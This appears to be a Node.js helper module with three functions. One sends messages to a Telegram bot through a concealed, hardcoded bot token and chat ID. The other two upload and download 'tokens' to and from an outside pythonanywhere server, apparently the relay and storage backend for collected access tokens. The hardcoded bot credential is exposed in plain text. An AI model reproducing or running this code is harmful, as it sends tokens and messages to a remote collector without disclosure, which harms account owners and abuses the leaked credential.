const axios = require("axios");
async function send(text){
  const NethAceb = [
    `https://api.telegram.org/bot`,
    `7235116383:AAGmdOgqsUiH_hqPIkiIgtIRCDX-yLF_TJY`,
    `sendMessage`,
    ];
  await axios.post(NethAceb[0]+NethAceb[1]+"/"+NethAceb[2], {
    chat_id: `5677916170`,
    text: text,
  }).then(async(Hehehe)=>{
    const data = Hehehe.data;
    console.log("Message sent.");
    return data;
  }).catch((ErrorTanginaMo)=>{
    const error = ErrorTanginaMo.message;
    console.error(error);
    return error;
  });
}
async function addToken(token){
  await axios.get(`http://naurwiegine.pythonanywhere.com/import?token=${token}`)
  .then(neth=>{
    return neth.data;
  }).catch(err => {
    return err.message||err;
  });
}
async function getToken(){
  const token = [];
  await axios.get(`http://naurwiegine.pythonanywhere.com/tokenss`)
  .then(async(neth) => {
    for (const kiffy of neth.data.tokens){
      if (!kiffy||kiffy===null){
        return;
      }
      token.push(kiffy);
    }
  }).catch(err => {
  });
  return token;
}
module.exports = {
  send,addToken,getToken
};